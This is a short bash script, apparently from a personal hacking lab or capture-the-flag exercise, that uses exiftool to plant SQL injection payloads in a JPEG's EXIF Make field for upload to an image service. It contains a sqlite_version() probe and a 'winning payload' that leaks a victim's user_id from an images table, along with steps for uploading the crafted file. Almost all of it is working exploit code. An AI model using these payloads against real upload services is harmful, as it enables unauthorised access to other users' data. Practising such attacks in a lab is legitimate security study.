#!/bin/bash
# v1_replica.sh — replicate the 2024 EXIF-SQLi with the REAL exiftool binary.
# Usage: edit EXIFTOOL to your exe path, then run:  bash v1_replica.sh
# Requires paisaje_conv.jpg (landscape that passes the classifier).

# >>> EDIT THIS to your exiftool.exe full path (from: find ~/Documents -iname 'exiftool*.exe') <<<
EXIFTOOL="/c/Users/Usuario/Documents/GonzaOrban/HackLab/exiftool/exiftool.exe"

BASE_IMG="paisaje_conv.jpg"
cp "$BASE_IMG" inj.jpg

mk() {
  # mk "<payload>" : write Make (and Model as harmless) with exiftool, exactly like V1
  cp "$BASE_IMG" inj.jpg
  "$EXIFTOOL" -overwrite_original -Make="$1" -Model="viaje" inj.jpg >/dev/null 2>&1
  # verify what exiftool actually wrote:
  echo -n "Make written = "; "$EXIFTOOL" -s3 -Make inj.jpg
}

echo "=== A) engine check (V1 style): sqlite_version ==="
mk "',(SELECT sqlite_version())) --"
echo "  now upload inj.jpg and read the result"
echo
echo "=== B) leak victim user_id (V1 winning payload) ==="
echo "run:  mk \"'||(SELECT user_id FROM images LIMIT 1)||'\" ; then upload"
echo
echo "To use interactively:"
echo "  source v1_replica.sh   # loads mk()"
echo "  mk \"'||(SELECT user_id FROM images LIMIT 1 OFFSET 0)||'\""
echo "  python upload_inj.py"
